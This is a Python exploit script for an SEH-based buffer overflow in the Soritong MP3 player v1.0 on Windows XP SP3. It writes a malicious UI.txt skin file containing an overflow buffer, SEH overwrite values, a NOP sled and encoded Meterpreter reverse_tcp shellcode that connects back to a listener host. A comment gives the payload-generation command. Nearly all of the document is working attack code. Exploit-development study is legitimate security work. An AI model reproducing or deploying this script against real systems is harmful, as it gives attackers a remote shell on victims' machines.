# Soritong MP3 player v1.0 SEH based exploit
# Written by Andrew Lewis with help from corelan.be
# Tested on Windows XP SP3 (English)
# This script creates a malicious UI.txt file in "C:/Program Files/SoriTong/Skin/Default/UI.txt"

junk = "A" * 584 # trigger exception
SEH_pointer = "\xeb\x06\x90\x90" # jumps 6 bytes to shellcode
SEH_handler = "\x12\xe8\x01\x10" # jump to pop pop ret causing another exception; 0x1001e812
payload_buf = "\x90" * 50 # buffer for shellcode decoding

# shellcode generated with msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.237.128 LPORT=4444 R | msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai
# use multi/handler metasploit module for connect back meterpreter shell
shellcode = "\xba\xed\x1e\x06\x23\xd9\xeb\xd9\x74\x24\xf4\x58\x29\xc9" + \
"\xb1\x49\x31\x50\x14\x03\x50\x14\x83\xc0\x04\x0f\xeb\xfa" + \
"\xcb\x46\x14\x03\x0c\x38\x9c\xe6\x3d\x6a\xfa\x63\x6f\xba" + \
"\x88\x26\x9c\x31\xdc\xd2\x17\x37\xc9\xd5\x90\xfd\x2f\xdb" + \
"\x21\x30\xf0\xb7\xe2\x53\x8c\xc5\x36\xb3\xad\x05\x4b\xb2" + \
"\xea\x78\xa4\xe6\xa3\xf7\x17\x16\xc7\x4a\xa4\x17\x07\xc1" + \
"\x94\x6f\x22\x16\x60\xc5\x2d\x47\xd9\x52\x65\x7f\x51\x3c" + \
"\x56\x7e\xb6\x5f\xaa\xc9\xb3\xab\x58\xc8\x15\xe2\xa1\xfa" + \
"\x59\xa8\x9f\x32\x54\xb1\xd8\xf5\x87\xc4\x12\x06\x35\xde" + \
"\xe0\x74\xe1\x6b\xf5\xdf\x62\xcb\xdd\xde\xa7\x8d\x96\xed" + \
"\x0c\xda\xf1\xf1\x93\x0f\x8a\x0e\x1f\xae\x5d\x87\x5b\x94" + \
"\x79\xc3\x38\xb5\xd8\xa9\xef\xca\x3b\x15\x4f\x6e\x37\xb4" + \
"\x84\x08\x1a\xd1\x69\x26\xa5\x21\xe6\x31\xd6\x13\xa9\xe9" + \
"\x70\x18\x22\x37\x86\x5f\x19\x8f\x18\x9e\xa2\xef\x31\x65" + \
"\xf6\xbf\x29\x4c\x77\x54\xaa\x71\xa2\xfa\xfa\xdd\x1d\xba" + \
"\xaa\x9d\xcd\x52\xa1\x11\x31\x42\xca\xfb\x5a\xe8\x30\x6c" + \
"\xa5\x44\xd7\xec\x4d\x96\x28\xfc\xd1\x1f\xce\x94\xf9\x49" + \
"\x58\x01\x63\xd0\x12\xb0\x6c\xcf\x5e\xf2\xe7\xe3\x9f\xbd" + \
"\x0f\x8e\xb3\x2a\xe0\xc5\xee\xfd\xff\xf0\x85\x01\x6a\xfe" + \
"\x0f\x55\x02\xfc\x76\x91\x8d\xff\x5c\xa9\x04\x95\x1e\xc6" + \
"\x68\x79\x9f\x16\x3f\x13\x9f\x7e\xe7\x47\xcc\x9b\xe8\x52" + \
"\x60\x30\x7d\x5c\xd1\xe4\xd6\x34\xdf\xd3\x11\x9b\x20\x36" + \
"\xa0\xe0\xf6\x7f\x26\x10\x7d\x6c\xea"

junk2 = "\x90" * 4000

with open("C:/Program Files/SoriTong/Skin/Default/UI.txt", "w") as file:
	file.write(junk)
	file.write(SEH_pointer)
	file.write(SEH_handler)
	file.write(payload_buf)
	file.write(shellcode)
	file.write(junk2)
